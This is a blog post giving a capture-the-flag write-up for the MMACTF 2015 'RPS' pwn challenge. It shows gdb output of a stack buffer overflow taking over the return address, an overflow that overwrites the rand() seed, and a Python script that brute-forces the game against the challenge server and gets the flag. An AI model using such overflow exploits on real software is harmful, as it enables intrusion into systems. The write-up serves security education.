@@ -1,0 +1,515 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Write Up | MMACTF 2015 - Pwn - RPS - punMag</title>
+  <meta name="author" content="Tung Pun">
+
+  
+  <meta name="description" content="Problem
+Win 50 games in a row!
+nc milkyway.chal.mmactf.link 1641 rps.7z Try to overflow the input, I discover that with payload '1' * 88 + myaddr , I &hellip;">
+  
+
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+  
+  <link rel="canonical" href="http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="punMag" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-66338962-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+  
+</head>
+
+<body   >
+  <div id="sidebar_control"></div>
+  <div id="sidebar">
+    <div class="logo">
+       .pM
+    </div>
+    <div class="content hide">
+      <section role="navigation">
+        <header role="banner"><hgroup>
+  <h1><a href="/"><font size="4px">by</font> Tung Pun</a></h1>
+</hgroup>
+
+</header>
+        
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:tungpun.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+<hr/>
+<!--<ul class="main-navigation">
+  <li><a href="/">home</a></li>
+  <li><a href="//wg.dotkrnl.com/p/public">public</a></li>
+</ul>
+-->
+
+      </section>
+      
+        <section>
+  <h2>recent</h2>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/">Write Up | MMACTF 2015 - Pwn - RPS</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/11/have-fun-with-linux-configure-welcome-message/">Have Fun With Linux - Configure Welcome Message</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/11/hello-pwnable/">Hello Pwnable, Protostar Stack0~5</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/06/fctf-white-steganography-writeup/">FCTF White Steganography Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/06/fctf-easy-php/">FCTF Easy PHP Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+      
+    </div>
+  </div>
+  <div id="main">
+    <div class="content">
+      <article class="hentry" role="article">
+  
+  
+    <header>
+      <div class="back"><a href="/" onclick="history.go(-1);return false;">← Back</a></div>
+      <h1 class="entry-title">Write Up | MMACTF 2015 - Pwn - RPS</h1>
+    </header>
+  
+  <div class="entry-content"><pre><code>Problem
+Win 50 games in a row!
+nc milkyway.chal.mmactf.link 1641
+</code></pre>
+
+<p><a href="http://assets.score.mmactf.link/attachments/rps.7z-5c18b372802c14abfec93c81a2cfdc5bac7f5aeeb16ad7404aace7ae25591c6e">rps.7z</a></p>
+
+<p>Try to overflow the input, I discover that with payload <code>'1' * 88 + myaddr</code> , I can control the EIP to myaddr</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ r &lt; data
+</span><span class='line'>Starting program: /root/MMACTF/rps/rps &lt; data
+</span><span class='line'>What's your name: Hi, 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111114321ABCD
+</span><span class='line'>Let's janken
+</span><span class='line'>Game 1/50
+</span><span class='line'>Rock? Paper? Scissors? [RPS]Bye bye
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>[----------------------------------registers-----------------------------------]
+</span><span class='line'>RAX: 0x0
+</span><span class='line'>RBX: 0x0
+</span><span class='line'>RCX: 0x7ffff7b13f60 (&lt;__write_nocancel+7&gt;:      cmp    rax,0xfffffffffffff001)
+</span><span class='line'>RDX: 0x0
+</span><span class='line'>RSI: 0x7ffff7dd7780 --&gt; 0x0
+</span><span class='line'>RDI: 0x7ffff7dd6620 --&gt; 0xfbad2a84
+</span><span class='line'>RBP: 0x3131313131313131 ('11111111')
+</span><span class='line'>RSP: 0x7fffffffea78 ("4321ABCD")
+</span><span class='line'>RIP: 0x400ae2 (&lt;main+732&gt;:      ret)
+</span><span class='line'>R8 : 0x7ffff7dd7780 --&gt; 0x0
+</span><span class='line'>R9 : 0x7ffff7fed700 (0x00007ffff7fed700)
+</span><span class='line'>R10: 0x355
+</span><span class='line'>R11: 0x246
+</span><span class='line'>R12: 0x400710 (&lt;_start&gt;:        xor    ebp,ebp)
+</span><span class='line'>R13: 0x7fffffffeb50 --&gt; 0x1
+</span><span class='line'>R14: 0x0
+</span><span class='line'>R15: 0x0
+</span><span class='line'>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+</span><span class='line'>[-------------------------------------code-------------------------------------]
+</span><span class='line'>   0x400ad7 &lt;main+721&gt;: call   0x4006e0 &lt;fflush@plt&gt;
+</span><span class='line'>   0x400adc &lt;main+726&gt;: mov    eax,0x0
+</span><span class='line'>   0x400ae1 &lt;main+731&gt;: leave
+</span><span class='line'>=&gt; 0x400ae2 &lt;main+732&gt;: ret
+</span><span class='line'>   0x400ae3:    nop    WORD PTR cs:[rax+rax*1+0x0]
+</span><span class='line'>   0x400aed:    nop    DWORD PTR [rax]
+</span><span class='line'>   0x400af0 &lt;__libc_csu_init&gt;:  push   r15
+</span><span class='line'>   0x400af2 &lt;__libc_csu_init+2&gt;:        mov    r15d,edi
+</span><span class='line'>[------------------------------------stack-------------------------------------]
+</span><span class='line'>0000| 0x7fffffffea78 ("4321ABCD")
+</span><span class='line'>0008| 0x7fffffffea80 --&gt; 0x7fffffffeb00 --&gt; 0x7fffffffeb58 --&gt; 0x7fffffffed88 ("/root/MMACTF/rps/rps")
+</span><span class='line'>0016| 0x7fffffffea88 --&gt; 0x7fffffffeb58 --&gt; 0x7fffffffed88 ("/root/MMACTF/rps/rps")
+</span><span class='line'>0024| 0x7fffffffea90 --&gt; 0x100000000
+</span><span class='line'>0032| 0x7fffffffea98 --&gt; 0x400806 (&lt;main&gt;:      push   rbp)
+</span><span class='line'>0040| 0x7fffffffeaa0 --&gt; 0x0
+</span><span class='line'>0048| 0x7fffffffeaa8 --&gt; 0xe764facb54c92eb8
+</span><span class='line'>0056| 0x7fffffffeab0 --&gt; 0x400710 (&lt;_start&gt;:    xor    ebp,ebp)
+</span><span class='line'>[------------------------------------------------------------------------------]
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x0000000000400ae2 in main ()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But, the address of line printing &ldquo;Congrats&rdquo; message contains <strong>\x0a</strong> character.
+It is changed to other character when I push to the program.
+I also try injecting shellcode to postfix, but it doesn&rsquo;t work too.</p>
+
+<blockquote><p>Make it simple !</p></blockquote>
+
+<p>What about rand() ? Is it safe perfectly ?</p>
+
+<p>I pay attention to <code>seed</code> of rand function. Seem like it can be overflowed too :)</p>
+
+<p>Using gdb, i have where the name stored in memory</p>
+
+<p><img src="http://i.imgur.com/VjgdeOA.png" alt="name's address" /></p>
+
+<p>=> <code>$bp-0x50</code></p>
+
+<p>And <code>...seed</code></p>
+
+<p><img src="http://i.imgur.com/j93EyWq.png" alt="seed's address" /></p>
+
+<p>=> <code>$bp-0x20</code></p>
+
+<p>Calculate the length of payload:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0x50 - 0x20 = 0x30 ~ 48</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>seed = 'AAAA'
+</span><span class='line'>payload = 'A' * 48 + seed</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Keep the <code>seed</code>, we try to brute force the result.
+I use this code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/env python 2.7
+</span><span class='line'>
+</span><span class='line'>import socket
+</span><span class='line'>import telnetlib
+</span><span class='line'>import struct
+</span><span class='line'>
+</span><span class='line'>p = lambda x: struct.pack("I", x)
+</span><span class='line'>P = lambda x: struct.unpack("I", x)
+</span><span class='line'>q = lambda x: struct.pack("&lt;Q", x)
+</span><span class='line'>
+</span><span class='line'>def interact():
+</span><span class='line'>    t = telnetlib.Telnet()
+</span><span class='line'>    t.sock = s
+</span><span class='line'>    t.interact()
+</span><span class='line'>
+</span><span class='line'>def r_until(st, debug=False):
+</span><span class='line'>    ret = ""
+</span><span class='line'>    while st not in ret:
+</span><span class='line'>        lret = s.recv(8192)
+</span><span class='line'>        if debug and len(lret) &gt; 0:
+</span><span class='line'>            print lret
+</span><span class='line'>        ret += lret
+</span><span class='line'>    return ret
+</span><span class='line'>
+</span><span class='line'>def tryluck(s, c):
+</span><span class='line'>    s.send(c + '\n')
+</span><span class='line'>    result = s.recv(1024)    
+</span><span class='line'>    if 'win' in result:
+</span><span class='line'>        return True
+</span><span class='line'>    return False
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>    correctAnswer = []
+</span><span class='line'>    guessAnswer = 0                                     # 0 for R, 1 for P, 2 for S 
+</span><span class='line'>    for sessionID in range(0, 1000):        
+</span><span class='line'>        s = socket.create_connection(('milkyway.chal.mmactf.link', '1641'))
+</span><span class='line'>        print r_until(':')
+</span><span class='line'>        name = "A" * 52                                 # 48 + 4    
+</span><span class='line'>        s.send(name + '\n')            
+</span><span class='line'>        gameID = 0    
+</span><span class='line'>        while True:          
+</span><span class='line'>            print '[+] sessionID:', sessionID, '        gameID:', (gameID+1)
+</span><span class='line'>            print '[+] correctAnswer', correctAnswer                        
+</span><span class='line'>            print r_until(']', debug=True)
+</span><span class='line'>
+</span><span class='line'>            if gameID + 1 &lt;= len(correctAnswer):        # I have saved result for this game
+</span><span class='line'>                s.send(correctAnswer[gameID] + '\n')
+</span><span class='line'>                result = s.recv(1024)
+</span><span class='line'>                print '[+] Result:', result            
+</span><span class='line'>            else:                                       # no result for this game exists
+</span><span class='line'>                if guessAnswer == 0:
+</span><span class='line'>                    answer = 'S'
+</span><span class='line'>                elif guessAnswer == 1:
+</span><span class='line'>                    answer = 'R'
+</span><span class='line'>                else:
+</span><span class='line'>                    answer = 'P'
+</span><span class='line'>
+</span><span class='line'>                if not tryluck(s, answer):
+</span><span class='line'>                    guessAnswer += 1                    # choose another answer
+</span><span class='line'>                    break     
+</span><span class='line'>
+</span><span class='line'>                correctAnswer.append(answer)            # win, record the answer
+</span><span class='line'>                guessAnswer = 0                                                        
+</span><span class='line'>
+</span><span class='line'>            gameID += 1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Get flag: <code>MMA{treed_three_girls}</code></p>
+</div>
+  <footer>
+    <div class="articlemeta">
+      <span class="hide">
+        
+
+ @
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-09-09T15:14:40+00:00" pubdate data-updated="true"></time>
+      </span>
+      <span class="plus">
+        
+          <a href="#">+</a>
+        
+      </span>
+    </div>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/" data-via="" data-counturl="http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/" >Tweet</a>
+  
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <div class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/08/11/have-fun-with-linux-configure-welcome-message/" title="Previous Post: Have fun with Linux - Configure Welcome message">&laquo; Have fun with Linux - Configure Welcome message</a>
+      
+    </div>
+  </footer>
+
+
+</article>
+
+
+    </div>
+    <footer role="contentinfo"><div class="content">
+  <p>
+    Copyright &copy; 2015 Tung Pun
+  </p>
+</div>
+
+</footer>
+    
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+  </div>
+  <script src="/javascripts/modernizr-2.0.js"></script>
+<script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+<script src="/javascripts/libs/respond.js" type="text/javascript"></script>
+<script src="/javascripts/octopress.js" type="text/javascript"></script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var userAgent = navigator.userAgent.toLowerCase();
+  var isiPhone = (userAgent.indexOf('iphone') != -1 || userAgent.indexOf('ipod') != -1) ? true : false;
+  var isAndroid = (userAgent.indexOf('android') != -1) ? true : false;
+  clickEvent = (isiPhone || isAndroid) ? 'touchstart' : 'click';
+  $('#sidebar').on(clickEvent, function() {
+    $(this).toggleClass('open');
+  });
+  $('.articlemeta').on(clickEvent, function() {
+    toggleDisqus();
+    $(this).toggleClass('open');
+  });
+});
+</script>
+
+</body>
+</html>
